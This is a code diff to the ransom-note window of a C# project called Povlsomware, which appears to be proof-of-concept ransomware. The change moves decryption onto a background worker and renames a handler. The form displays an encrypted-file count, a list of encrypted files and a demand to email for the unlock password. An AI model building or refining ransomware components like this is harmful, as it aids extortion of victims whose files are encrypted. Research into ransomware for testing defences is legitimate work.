@@ -10,16 +10,16 @@ namespace Povlsomware
         public PayM3()
         {
             InitializeComponent();
+
             label2.Text = Program.count.ToString() + " files have been encrypted";
             listBox1.Items.AddRange(Program.encryptedFiles.ToArray());
-
             textBox2.Text = 
                 "Your files can only be retrived by entering the correct password. \n\r" +
                 "In order to get the password please send a mail to \n\r" +
                 "no-reply@forgetit.com.";
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void Button1_Click(object sender, EventArgs e)
         {
             string input = textBox1.Text;
 
@@ -27,8 +27,7 @@ namespace Povlsomware
             {
                 success = true;
                 button1.Text = "Decrypting... Please wait";
-                Program.UndoAttack(input);
-                Application.Exit();
+                backgroundWorker1.RunWorkerAsync(input);
             }
             else
             {
@@ -37,6 +36,8 @@ namespace Povlsomware
                 button1.Text = "Wrong Password... ";
             }
         }
+
+
 
         private void Screen_FormClosing(object sender, FormClosingEventArgs e)
         {
@@ -52,5 +53,16 @@ namespace Povlsomware
             Show();
         }
 
+        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
+        {
+            string input = e.Argument as string;
+            Program.UndoAttack(input);
+
+        }
+
+        private void backgroundWorker1_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
+        {
+            Application.Exit();
+        }
     }
 }
